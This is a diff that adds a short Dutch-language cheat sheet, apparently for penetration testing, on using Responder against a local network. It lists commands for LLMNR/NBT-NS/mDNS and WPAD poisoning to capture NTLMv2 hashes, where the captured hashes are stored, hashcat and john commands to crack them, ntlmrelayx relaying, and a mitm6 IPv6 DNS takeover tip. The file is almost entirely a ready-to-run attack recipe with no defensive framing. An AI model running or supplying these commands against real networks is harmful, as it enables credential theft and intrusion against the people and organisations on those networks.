@@ -1,0 +1,21 @@
+# Responder - LLMNR/NBT-NS/mDNS Poisoning voor credential capture
+# Vangt NTLMv2 hashes op door naam-resolutie te vergiftigen
+# Starten (passieve modus - alleen luisteren):
+responder -I eth0 -A
+# Actieve modus (poisoning):
+responder -I eth0 -wrf
+# Met WPAD proxy:
+responder -I eth0 -wrfb
+# Specifiek protocol uitschakelen (bijv. SMB):
+responder -I eth0 -wrf --disable-ess
+# Hashes staan in:
+# /usr/share/responder/logs/
+# Kraken met hashcat:
+# hashcat -m 5600 hashes.txt wordlist.txt
+# Kraken met john:
+# john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
+# NTLM relay ipv kraken (geen wachtwoord nodig):
+# ntlmrelayx.py -tf targets.txt -smb2support
+# Tip: -A modus is veilig voor eerste verkenning (geen poisoning)
+# Tip: Werkt het best in netwerken zonder DNS voor interne namen
+# Tip: IPv6 DNS takeover: mitm6 + ntlmrelayx is vaak effectiever
